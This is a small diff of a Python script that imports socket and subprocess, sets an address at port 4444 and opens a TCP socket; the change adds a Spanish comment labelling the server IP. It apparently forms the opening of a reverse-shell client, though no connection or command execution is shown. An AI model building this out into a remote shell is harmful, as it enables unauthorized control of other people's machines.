@@ -1,6 +1,7 @@
 import socket
 import subprocess
 
+#ip del servidor
 ip = ("10.0.0.0",4444)
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
